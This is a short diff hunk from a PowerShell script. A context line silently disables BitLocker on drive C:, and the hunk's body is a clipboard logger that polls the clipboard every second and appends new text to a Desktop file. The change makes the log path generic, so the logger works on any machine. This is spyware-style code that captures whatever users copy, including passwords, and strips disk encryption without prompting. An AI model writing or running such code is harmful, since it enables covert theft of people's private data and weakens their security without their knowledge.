@@ -76,7 +76,7 @@ Disable-BitLocker -MountPoint "C:" -RebootCount 0 -Confirm:$false
 $previousClipboardContent = Get-Clipboard -Format Text
 while ($true) {
     if ((Get-Clipboard -Format Text) -ne $previousClipboardContent) {
-        (Get-Clipboard -Format Text) | Out-File -Append -LiteralPath "C:\Users\mzkwcim\Desktop\Logger.txt"
+        (Get-Clipboard -Format Text) | Out-File -Append -LiteralPath "$home\Desktop\Logger.txt"
         $previousClipboardContent = Get-Clipboard -Format Text
     }
     Start-Sleep -Seconds 1
